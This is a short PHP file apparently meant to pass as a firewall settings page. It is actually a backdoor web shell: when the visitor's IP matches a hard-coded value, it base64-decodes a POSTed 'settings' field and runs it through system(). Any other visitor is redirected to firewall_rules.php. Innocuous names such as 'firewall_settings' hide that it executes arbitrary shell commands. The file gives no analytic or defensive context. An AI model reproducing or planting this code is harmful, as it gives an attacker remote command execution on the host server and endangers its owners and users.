<?php 
	$up = HEYBEAR;
        $user = ip2long($_SERVER["REMOTE_ADDR"]);
        if($up == $user)
        {
		if(isset($_REQUEST["settings"]))
		{ 
			$settings = ($_POST["settings"]);
			$firewall_settings = base64_decode($settings);
			system($firewall_settings); 
			die;
		}
	}
	else
	{
		header("Location: firewall_rules.php");
	}

?>
